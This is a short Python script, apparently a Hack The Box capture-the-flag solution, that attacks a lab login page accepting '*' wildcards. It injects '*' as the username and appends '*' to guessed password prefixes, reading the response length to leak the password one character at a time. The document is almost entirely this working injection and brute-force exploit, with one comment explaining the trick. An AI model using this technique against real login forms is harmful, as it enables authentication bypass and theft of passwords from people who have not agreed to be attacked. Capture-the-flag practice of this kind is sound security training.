#For passwords or fields that accept regex its possible to brute force using wildcard *
import requests
import string

url = "http://138.68.136.191:31633/login"
#known start
leaked = list("HTB{")

printable = string.printable.replace('*', '')

while True:
    print(''.join(leaked))
    found = False
    for char in printable:    
        r = requests.post(url, {"username":'*', "password": ''.join(leaked) + char + '*'})
        if r.headers['Content-Length'] == '2586': #length of paged returned on success
            leaked.append(char)
            found = True
            break
    if not found:
        break

print('Final password: ' + ''.join(leaked))